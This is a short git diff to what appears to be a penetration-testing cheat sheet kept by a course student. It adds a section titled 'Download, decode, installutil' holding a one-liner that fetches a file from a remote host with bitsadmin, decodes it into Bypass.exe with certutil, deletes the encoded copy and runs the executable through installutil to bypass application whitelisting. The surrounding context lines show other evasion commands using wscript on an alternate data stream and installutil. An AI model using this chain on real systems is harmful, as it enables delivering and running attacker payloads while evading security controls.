@@ -60,6 +60,10 @@ wscript "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:test.js"
 ```
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Tools\Bypass.exe
 ```
+## Download, decode, installutil
+```
+bitsadmin /Transfer myJob http://192.168.119.120/file.txt C:\users\student\enc.txt && certutil -decode C:\users\student\enc.txt C:\users\student\Bypass.exe && del C:\users\student\enc.txt && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\users\student\Bypass.exe
+```
 # AV
 ## Find signature
 ```
